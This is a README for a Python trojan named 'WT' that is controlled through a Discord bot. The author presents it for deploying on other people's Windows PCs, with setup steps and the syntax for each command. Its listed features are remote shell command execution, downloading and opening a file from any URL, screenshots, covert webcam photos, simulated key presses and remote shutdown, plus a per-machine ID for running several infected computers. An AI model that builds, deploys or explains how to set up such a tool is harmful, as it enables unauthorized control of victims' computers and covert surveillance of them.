# About
This is a trojan "WT", which was written in python and displays logs through the bot's discord (nextcord library)

# Functional
> All commands work on discord slash
1. Run command in windows cmd (/cmd_command)
2. Open text through windows message box (This is a separate instruction) (/messagebox)
3. Download and open file (/openfile_url)
4. Turn off computer (/power-off)
5. Press a key or key combination (1 key: "alt", combo: "alt+f4") (/press_key)
6. Ricroll (/ricroll)
7. Make screenshot (/screenshot)
8. Open site in browser (/site_open)
9. Check pc on online now (/status)
10. Make photo from web cam (/web_cam)

# How to start
In the folder with the "main.py" file, there should be 1 more "vol" file. This is a text document without the .txt extension, it must contain the computer number (This number is used to distinguish several computers from each other, in case the virus is on several computers at once)

You also need a discord bot token to use (How to create it and invite it to the server, see youtube)

Paste the bot's discord token into this variable:
```python
token="Paste here" #Your token
```
And to work, you need the id of the text channel where the results of your commands will be sent (To copy the id, you need to enable "developer mode" in the discord settings, see youtube for more details):
```python
channel=client.get_channel(Paste here) #Your channel id
```

 For almost all commands, there is a mandatory argument "admin", this is the "administrator password", it was created so that if you are not the only one controlling the virus, then only you could have access to the execution of these commands.

You can change the password in this variable:
```python
admp="0000" #Password of administrator (string variable)
```
 Everything is almost ready, it remains only to download the necessary python libraries (They are written in requirements.txt)
- - -
# How to use commands
## What is "admin"?:
This is the password of administrator (In variable admp)
## /cmd_command
> /cmd_command \<num: str\> \<command: str\> \<admin: str\>

"num" - variable in "vol" file(Id of pc)
"command" - command to run in cmd
"admin" - admin password
>P.S:  I will no longer talk about the meanings of the "num" and "admin" arguments, since they are in almost all commands.
## /messagebox
> /messagebox \<num: str\> \<title: str\> \<text: str\> \<num_of_msgbox: str\> \<admin: str\>

"title" - title of message box
"text" - text of message box(Content)
"num_of_msgbox" - this is two numbers like buttons and icon


>1.  You can write any number from 1,2,3 or 4 instead of 0 (before the '+' symbol) 
Below is the meaning of these numbers:

>0 = OK Button, 
1 = OK / Cancel Button, 
2 = Abort / Retry / Ignore Button, 
3 = Yes / No / Cancel Button, 
4 = Yes / No Button, 
5 = Retry / Cancel Button

>2.  You can write 32 or 48 or 64 instead of 16.
Below is the meaning of each number:

>16 = Critical Icon, 
32 = Help Icon, 
48 = Warning Icon, 
64 = Information Icon

>Example: 1+48

/messagebox create vbs script on C:\ProgramData
And write vbs code to open message box
## /openfile_url
>/openfile_url \<num: str\> \<url: str\> \<admin: str\>

"urt" - url of file
Example: https://random.site.com/photos/image.jpg
## /power-off
>/power-off \<num: str\> \<admin: str\>

Just power off pc
## /press_key
>/press_key \<num: str\> \<key: str\> \<admin: str\> 

"key" - Key
Example : "alt+tab" or "alt+f4" or "ctrl+alt+del" or "win"...
- - -
That's all I wanted to say, if you have any questions, ask them!
